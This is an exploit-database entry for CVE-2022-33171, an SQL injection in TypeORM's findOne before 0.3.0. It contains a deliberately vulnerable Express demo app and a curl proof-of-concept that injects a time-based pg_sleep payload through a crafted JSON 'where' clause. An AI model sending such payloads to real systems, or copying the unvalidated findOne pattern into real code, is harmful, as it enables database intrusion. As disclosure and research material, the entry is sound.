@@ -1,0 +1,79 @@
+id: 37826
+date: 07/01/2022
+title: TypeORM SQL Injection Vulnerability
+author: lixts
+cves: CVE-2022-33171
+
+typeorm CVE-2022-33171
+
+findOne(id), findOneOrFail(id)
+
+The findOne function in TypeORM before 0.3.0 can either be supplied with a string or a FindOneOptions object. When input to the function is a user-controlled parsed JSON object, supplying a crafted FindOneOptions instead of an id string leads to SQL injection.
+
+The issue was already fixed from version 0.3.0 onward when we encountered it.
+
+Maintainer does not consider this a vulnerability and stated the root cause is bad input validation.
+
+On one hand input validation is definitely insufficient. On the other hand this is a function argument that is meant to be fed user input and as such one would think it safe to put user input there.
+
+Vulnerable app:
+```
+
+import {
+  Entity,
+  PrimaryGeneratedColumn,
+  Connection,
+  ConnectionOptions,
+  Repository,
+  createConnection
+} from 'typeorm';
+import * as express from 'express';
+import {Application, Request, Response} from 'express';
+
+let connection: Connection;
+
+async function myListener(request: Request, response: Response) {
+  if(!connection)
+    connection = await createConnection(connectionOpts);
+  const userRepo: Repository<User> = connection.getRepository(User);
+
+  const ids: string[] = request.body;
+  for(const id of ids) {
+    try {
+      await userRepo.findOne(id);
+    } catch(err: any) {
+      console.log(err);
+    }
+  }
+  response.json({});
+}
+
+@Entity({ name: 'user' })
+class User {
+    @PrimaryGeneratedColumn('uuid')
+    id: string;
+}
+
+const connectionOpts: ConnectionOptions = {
+  type: 'postgres',
+  name: 'myconnection',
+  host: 'db-host',
+  port: 5432,
+  username: 'username',
+  password: 'password',
+  database: 'mydb',
+  schema: 'public',
+  entities: [User]
+}
+
+const app: Application = express();
+app.use(express.json());
+app.post( "/findByIds", myListener);
+app.listen(4444, () => console.log('App started'));
+
+```
+
+Exploit:
+curl -v [http://host/findByIds](http://containerip:4444/findByIds)' -H 'Content-Type: application/json' --data '[{"where":"1=1; SELECT pg_sleep(10) --"}]'
+
+#  0day.today [2023-03-26]  #
